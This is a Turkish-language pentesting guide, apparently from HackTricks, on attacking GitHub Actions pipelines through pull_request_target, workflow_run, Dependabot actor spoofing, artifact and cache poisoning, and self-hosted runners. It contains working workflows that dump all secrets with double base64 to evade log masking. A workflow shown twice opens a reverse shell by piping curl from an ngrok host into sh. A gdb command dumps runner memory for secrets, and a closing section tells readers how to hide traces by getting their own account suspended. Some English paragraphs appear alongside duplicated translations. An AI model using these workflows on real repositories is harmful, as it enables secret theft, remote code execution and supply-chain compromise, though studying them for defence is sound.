# Github Actions'ı Kötüye Kullanma

{{#include ../../../banners/hacktricks-training.md}}

## Araçlar

Aşağıdaki araçlar Github Action workflow'larını bulmak ve bazılarının zafiyetlerini tespit etmek için faydalıdır:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Ayrıca checklist'ine şu adresten bakın: [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Temel Bilgiler

Bu sayfada şunları bulacaksınız:

- Bir saldırganın bir Github Action'a erişim sağlaması durumunda ortaya çıkan tüm etkilerin **özeti**
- Bir action'a **erişim sağlama** için farklı yollar:
- Action oluşturmak için **izinlere sahip olma**
- **pull request** ile ilgili tetikleyicileri kötüye kullanma
- Diğer **harici erişim** tekniklerini kötüye kullanma
- Halihazırda ele geçirilmiş bir repo'dan **Pivoting**
- Son olarak, bir action'ı içeriden kötüye kullanmak için **post-exploitation techniques** (bahsedilen etkileri gerçekleştirmek için) bölümü

## Etkiler Özeti

Github Actions hakkında bir giriş için [**Github Actions hakkında temel bilgileri kontrol edin**](../basic-github-information.md#github-actions).

Eğer bir repository içinde **GitHub Actions'ta keyfi kod çalıştırabiliyorsanız**, şunları yapabilirsiniz:

- Pipeline'e mount edilmiş **secrets**'i çalıp, pipeline'ın ayrıcalıklarını **kötüye kullanarak** AWS ve GCP gibi harici platformlara yetkisiz erişim elde edebilirsiniz.
- Deployment'ları ve diğer **artifacts**'ı tehlikeye atabilirsiniz.
- Eğer pipeline varlıkları deploy ediyor veya depoluyorsa, nihai ürünü değiştirebilir ve bu sayede bir supply chain attack'a yol açabilirsiniz.
- Özel workers'ta **kod çalıştırma** ile hesaplama gücünü kötüye kullanma ve diğer sistemlere pivot yapma.
- `GITHUB_TOKEN` ile ilişkilendirilmiş izinlere bağlı olarak **repository kodunu overwrite etme**.

## GITHUB_TOKEN

Bu "**secret**" ( `${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'den gelen) yönetici bu seçeneği etkinleştirdiğinde verilir:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github Application'ın kullanacağı** token ile aynıdır, dolayısıyla aynı endpoint'lere erişebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github, repo'nun `GITHUB_TOKEN` kullanarak GitHub içindeki diğer internal repolara erişmesine olanak veren bir [**flow**](https://github.com/github/roadmap/issues/74) yayınlamalı.

Bu token için olası **permissions**'ları şurada görebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Unutmayın ki token **job tamamlandıktan sonra süresi dolar**.\
Bu tokenler şu şekilde görünür: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceğiniz bazı ilginç şeyler:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Bazı durumlarda **github user tokens inside Github Actions envs or in the secrets** bulabileceğinizi unutmayın. Bu tokenlar repository ve organization üzerinde size daha fazla ayrıcalık verebilir.

<details>

<summary>Github Action çıktısında secrets'i listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets ile reverse shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Diğer kullanıcıların depolarında Github Token'a verilen izinleri **logları kontrol ederek** actions yürütme kayıtlarından görebilirsiniz:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## İzinli Çalıştırma

> [!NOTE]
> Bu, Github actions'ı ele geçirmenin en kolay yolu olur; bu durum organizasyonda **yeni bir repo oluşturma** yetkisine sahip olduğunuzu veya bir depoda **yazma ayrıcalıklarına** sahip olduğunuzu varsayar.
>
> Bu senaryodaysanız [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) bölümünü inceleyebilirsiniz.

### Repo Oluşturularak Çalıştırma

Organizasyon üyeleri **yeni repolar oluşturabiliyorsa** ve siz github actions çalıştırabiliyorsanız, **yeni bir repo oluşturup organizasyon düzeyinde ayarlanmış secrets'i çalabilirsiniz**.

### Yeni Bir Dal Üzerinden Çalıştırma

Eğer zaten bir Github Action içeren bir depoda **yeni bir branch oluşturabiliyorsanız**, onu **değiştirip**, içeriği **yükleyebilir** ve sonra **o action'ı yeni branch'tan çalıştırabilirsiniz**. Bu şekilde repository ve organizasyon düzeyindeki secrets'i **exfiltrate** edebilirsiniz (ama onların nasıl adlandırıldığını bilmeniz gerekir).

> [!WARNING]
> Sadece workflow YAML içinde uygulanan herhangi bir kısıtlama (örneğin, `on: push: branches: [main]`, job conditionals, veya manual gates) işbirlikçiler tarafından düzenlenebilir. Harici bir zorlayıcı (branch protections, protected environments, ve protected tags) olmadan bir katkı sağlayıcı, bir workflow'u kendi branch'ında çalıştırılacak şekilde yönlendirebilir ve mounted secrets/permissions'ı kötüye kullanabilir.

Değiştirdiğiniz action'ı **manuel olarak**, bir **PR oluşturulduğunda** veya **bazı kodlar push edildiğinde** (ne kadar dikkat çekmek istediğinize bağlı olarak) çalıştırılabilir hale getirebilirsiniz:
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Fork'lanmış Çalıştırma

> [!NOTE]
> Başka bir repository'nin **Github Action'ını çalıştırmasına** izin verebilecek farklı tetikleyiciler vardır. Bu tetiklenebilir actions kötü yapılandırılmışsa, bir saldırgan bunları ele geçirebilir.

### `pull_request`

Workflow tetikleyicisi **`pull_request`**, bazı istisnalar dışında bir pull request alındığında workflow'u her seferinde çalıştırır: varsayılan olarak eğer **ilk kez** katkıda bulunuyorsanız, bazı **maintainer**'ların workflow'un **run**'ını **approve** etmesi gerekecektir:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Varsayılan kısıtlama **ilk kez** katkıda bulunanlar içindir; geçerli bir bug/typo düzelterek katkıda bulunabilir ve sonra yeni `pull_request` ayrıcalıklarınızı kötüye kullanmak için **diğer PR'lar** gönderebilirsiniz.
>
> **Bunu test ettim ve çalışmıyor**: ~~Another option would be to create an account with the name of someone that contributed to the project and deleted his account.~~

Ayrıca, varsayılan olarak hedef repoya **yazma izinlerini** ve **secrets erişimini** engeller, bu [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) bölümünde belirtildiği gibi:

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Bir saldırgan, Github Action tanımını değiştirerek rastgele komutlar çalıştırabilir ve rastgele actions ekleyebilir. Ancak, bahsedilen sınırlamalar nedeniyle secrets çalamaz veya repoyu overwrite edemez.

> [!CAUTION]
> **Evet, eğer saldırgan PR'de tetiklenecek github action'ı değiştirirse, kullanılacak olan onun Github Action'ı olacak ve origin repo'nunkisi olmayacaktır!**

Saldırgan çalıştırılan kodu da kontrol ettiğinden, `GITHUB_TOKEN` üzerinde secrets veya yazma izinleri olmasa bile saldırgan örneğin **kötü amaçlı artifact'lar** yükleyebilir.

### **`pull_request_target`**

Workflow tetikleyicisi **`pull_request_target`**, hedef repoya **yazma iznine** ve **secrets erişimine** sahiptir (ve izin istemez).

Dikkat: workflow tetikleyicisi **`pull_request_target`**, PR tarafından sağlanan bağlamda değil, **base context**'te çalışır (güvenilmeyen kodu çalıştırmamak için). `pull_request_target` hakkında daha fazla bilgi için [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) bölümüne bakın.\
Ayrıca, bu spesifik tehlikeli kullanım hakkında daha fazla bilgi için şu [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) yazısına bakın.

Çalıştırılan workflow **base**'de tanımlı olup **PR**'de değil diye **`pull_request_target`** kullanmak **güvenli** gibi görünebilir, ancak **güvenli olmadığı** birkaç durum vardır.

Ve bunun **secrets erişimi** olacaktır.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

Bu ayrıca dokümanlara göre: `workflow_run` olayıyla başlatılan workflow, **önceki workflow başlatmamış olsa bile secrets'e erişebilir ve write token'lar oluşturabilir**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

Bu tür bir workflow, dış bir kullanıcının **`pull_request`** veya **`pull_request_target`** ile tetikleyebileceği bir **workflow**'a **bağımlıysa** saldırıya uğrayabilir. Birkaç zayıf örnek [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)'da bulunabilir. İlk örnek, **`workflow_run`** ile tetiklenen workflow'un saldırganın kodunu indiriyor olmasıdır: `${{ github.event.pull_request.head.sha }}`\
İkinci örnek ise **untrusted** koddan bir **artifact** geçirip bu artifact içeriğini `workflow_run` içinde kullanmak ve bunun **RCE'ye açık** bir şekilde işlenmesidir.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

We have mentioned all the ways an external attacker could manage to make a github workflow to execute, now let's take a look about how this executions, if bad configured, could be abused:

## Abusing Forked Execution

Dış bir saldırganın bir github workflow'unu çalıştırmasını sağlayabileceği tüm yolları bahsetmiştik; şimdi bu çalıştırmalar kötü yapılandırılmışsa nasıl kötüye kullanılabileceğine bakalım:

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), but someone needs to **authorize it first** and it will run with some [limitations](#pull_request).

**`pull_request`** durumunda workflow, **PR bağlamında** çalıştırılacaktır (yani **kötücül PR kodu** çalıştırılır), fakat önce birinin **onaylaması gerekir** ve bazı [sınırlamalar](#pull_request) ile çalışacaktır.

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

Eğer bir workflow, **`pull_request_target` veya `workflow_run`** kullanıyor ve bunun bağlı olduğu workflow **`pull_request_target` veya `pull_request`** ile tetiklenebiliyorsa, orijinal repo kodu çalıştırılır; dolayısıyla **saldırgan çalıştırılan kodu kontrol edemez**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

> [!CAUTION]
> Ancak eğer **action**'ın **açık bir PR checkout**'ı varsa ve **kod PR'dan alınıyorsa** (base'den değil), saldırgan tarafından kontrol edilen kod kullanılacaktır. Örneğin (PR kodunun indirildiği 12. satıra bakın):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

Potansiyel olarak **untrusted code `npm install` veya `npm build` sırasında çalıştırılıyor** çünkü build script'leri ve referans verilen **packages PR yazarı tarafından kontrol ediliyor**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

> [!WARNING]
> Zafiyete açık action'ları aramak için bir github dork'u: `event.pull_request pull_request_target extension:yml` ancak, action güvensiz yapılandırılmış olsa bile job'ların güvenli şekilde çalıştırılması için (ör. PR'ı oluşturan actor kim olduğuna dair koşullar kullanmak gibi) farklı konfigürasyon yolları vardır.

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

PR'ı oluşturan **kullanıcı** tarafından **kontrol edilen** bazı [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) olduğunu unutmayın. Eğer github action bu **veriyi herhangi bir şey çalıştırmak için** kullanıyorsa, bu **rastgele kod yürütmeye** yol açabilir:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Dokümanlara göre: Bir workflow job'ında bir environment variable'ı tanımlayarak veya güncelleyerek ve bunu **`GITHUB_ENV`** environment dosyasına yazarak **sonraki adımlarda kullanılabilir hale getirebilirsiniz**.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD_PRELOAD** or **NODE_OPTIONS**.

Eğer bir saldırgan bu **env** değişkenine **herhangi bir değer** enjekte edebilirse, sonraki adımlarda **LD_PRELOAD** veya **NODE_OPTIONS** gibi kod çalıştırabilecek env değişkenleri enjekte edebilir.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

Örneğin ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), yüklenen bir artifact'in içeriğini **`GITHUB_ENV`** env değişkenine koymaya güvenen bir workflow hayal edin. Bir saldırgan bunu kötüye kullanmak için şu tarz bir şey yükleyebilir:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

As indicated in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), several organizations have a Github Action that merges any PRR from `dependabot[bot]` like in:

### Dependabot and other trusted bots

[**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest)'de belirtildiği gibi, bazı organizasyonlar `dependabot[bot]`'tan gelen herhangi bir PR'ı otomatik olarak merge eden bir Github Action'a sahiptir; örneğin:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Bu bir problem çünkü `github.actor` alanı workflow'u tetikleyen son olayı oluşturan kullanıcıyı içerir. Ve `dependabot[bot]` kullanıcısının bir PR'ı değiştirmesini sağlamak için birkaç yol vardır. Örneğin:

- Hedef repository'yi forkla
- Kötü amaçlı payload'u kendi kopyana ekle
- Fork'unda Dependabot'u etkinleştirerek eski bir dependency ekle. Dependabot, dependency'yi düzeltmek için kötü amaçlı kod içeren bir branch oluşturacak.
- O branch'ten hedef repository'ye bir Pull Request aç (PR kullanıcı tarafından oluşturulacağı için henüz bir şey olmayacak)
- Sonra, saldırgan fork'unda Dependabot'un açtığı ilk PR'ye geri döner ve `@dependabot recreate` komutunu çalıştırır
- Bunun üzerine Dependabot o branch'te bazı işlemler gerçekleştirir; bu, hedef repo üzerindeki PR'ı değiştirdiği için `dependabot[bot]` workflow'u tetikleyen son olayın actor'ü olur (ve dolayısıyla workflow çalışır).

Devam edersek, merge etmek yerine Github Action'ın içinde şu örnekteki gibi bir command injection olsa ne olur:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Orijinal blog yazısı, bu davranışı kötüye kullanmak için iki seçenek öneriyor; ikinci seçenek şudur:

- victim repository'yi fork'layın ve Dependabot'u eski bir dependency ile etkinleştirin.
- malicious shell injeciton code içeren yeni bir branch oluşturun.
- Repo'nun default branch'ini o branch olarak değiştirin.
- Bu branch'ten victim repository'ye bir PR oluşturun.
- `@dependabot merge`'i Dependabot'un fork'unda açtığı PR'da çalıştırın.
- Dependabot değişikliklerini fork'ladığınız repository'nin default branch'ine mergeleyecek; victim repository'deki PR'ı güncelleyerek workflow'u tetikleyen son event'in actor'ü olarak `dependabot[bot]`'u atayacak ve kötü amaçlı bir branch adı kullanacak.

### Güvenlik açığı olan Üçüncü Taraf Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Bu [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) yazısında belirtildiği gibi, bu Github Action farklı workflows'lerden ve hatta repositories'den artifacts'a erişim sağlıyor.

Sorun şu ki, **`path`** parametresi ayarlı değilse, artifact mevcut dizine çıkarılıyor ve daha sonra workflow'da kullanılabilecek veya çalıştırılabilecek dosyaların üzerine yazabilir. Bu nedenle, Artifact zafiyetliyse, bir saldırgan bunu Artifact'e güvenen diğer workflows'ları bozmak için kötüye kullanabilir.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu, şu workflow ile istismar edilebilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Diğer Harici Erişim

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Yani eğer bir action var olmayan bir hesabın bir repo'sunu kullanıyorsa, bir saldırgan o hesabı oluşturup action'ı ele geçirebilir.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Bu bölümde, ilk repo üzerinde bir tür erişimimiz olduğunu varsayarsak, **pivot from one repo to another** yapmamıza izin verecek tekniklerden bahsedeceğiz (önceki bölüme bakın).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC üzerinden AWS ve GCP'ye erişim

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Secrets'e erişim <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir script'e içerik enjekte ediyorsanız, secrets'e nasıl erişebileceğinizi bilmek faydalıdır:

- Eğer secret veya token bir **environment variable** olarak ayarlanmışsa, doğrudan ortam üzerinden **`printenv`** ile erişilebilir.

<details>

<summary>Github Action çıktısında secrets'leri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Secrets ile reverse shell elde et</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Eğer secret **doğrudan bir ifadede** kullanılıyorsa, oluşturulan shell script **diskte** saklanır ve erişilebilir.
- ```bash
cat /home/runner/work/_temp/*
```
- For a JavaScript actions the secrets and sent through environment variables
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerate all secrets via the secrets context (collaborator level). A contributor with write access can modify a workflow on any branch to dump all repository/org/environment secrets. Use double base64 to evade GitHub’s log masking and decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Self-hosted runners'ın kötüye kullanılması

Hangi **Github Actions are being executed in non-github infrastructure** olduğu bulunmanın yolu, Github Action konfigürasyon yaml'ında **`runs-on: self-hosted`** aramaktır.

**Self-hosted** runner'lar ekstra hassas bilgilere, diğer **network systems**'lere (ağdaki zafiyetli endpoint'ler? metadata service?) erişim sağlayabilir veya izole edilip yok edilse bile, **aynı anda birden fazla action çalıştırılabilir** ve kötü amaçlı olan diğerinin **secrets'lerini çalabilir**.

In self-hosted runners it's also possible to obtain the **secrets from the \_Runner.Listener\_\*\* process\*\* which will contain all the secrets of the workflows at any step by dumping its memory:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Daha fazla bilgi için [**bu yazıya bakın**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Github actions ile **build and store a Docker image inside Github** yapacak workflow'lar oluşturmak mümkündür. Aşağıdaki açılır bölümde bir örnek bulunuyor:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Önceki kodda görebileceğiniz gibi, Github registry **`ghcr.io`** üzerinde barındırılıyor.

Repo üzerinde okuma iznine sahip bir kullanıcı, kişisel erişim tokenı kullanarak Docker Image'i indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions loglarındaki hassas bilgiler

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## İzleri Gizleme

(Teknik [**buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Öncelikle, açılan herhangi bir PR GitHub'da ve hedef GitHub hesabında kamuya açık olarak görünür. GitHub'da varsayılan olarak, internetten bir PR'yi **silme** imkanımız yoktur, ancak bir nüans vardır. GitHub tarafından **suspended** edilen hesapların tüm **PR'leri otomatik olarak silinir** ve internetten kaldırılır. Bu yüzden faaliyetlerinizi gizlemek için ya **GitHub hesabınızın suspended edilmesini** sağlamalı ya da hesabınızın **flagged** edilmesini sağlamalısınız. Bu, GitHub'daki tüm faaliyetlerinizi internetten **gizleyecektir** (temelde tüm exploit PR'lerinizi kaldırır).

Bir GitHub organizasyonu, hesapları GitHub'a bildirme konusunda oldukça proaktiftir. Yapmanız gereken tek şey Issue'da “bazı şeyler” paylaşmak; onlar hesabınızın 12 saat içinde suspended edilmesini sağlar :p ve işte, exploit'iniz GitHub'da görünmez hale gelir.

> [!WARNING]
> Bir organizasyonun hedeflendiğini anlayabilmesinin tek yolu, GitHub UI'dan PR silineceği için SIEM üzerinden GitHub loglarını kontrol etmektir.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

